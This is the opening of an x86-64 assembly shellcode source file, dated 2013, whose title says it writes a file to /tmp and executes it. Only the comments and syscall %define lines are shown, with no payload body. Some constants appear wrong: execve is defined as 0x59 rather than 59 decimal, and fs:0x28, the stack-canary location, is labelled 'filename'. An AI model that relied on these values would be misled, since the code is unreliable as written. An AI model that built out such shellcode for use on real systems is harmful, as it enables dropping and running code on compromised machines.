	;; Evan Jensen 64bit Put a file in /tmp and execve it shellcode
	;; Paolo Soto
	;; Sun Mar 10 21:37:35 EDT 2013

	;; %eax = syscall number
	;; args = %ebx, %ecx, %edx, %esi, %edi, %ebp (last can be ptr to > 6)
	;; args = rdi, rsi, rdx, rcx, r8, r9, then stack
	
	%define __NR_open   BYTE 0x2
	%define __NR_write  BYTE 0x1
	%define __NR_mmap   BYTE 0x9
	%define __NR_execve BYTE 0x59 
	%define filename   fs:0x28 ; 64 bit 
	;%define stackcookie [gs:0x14] ; 32 bit

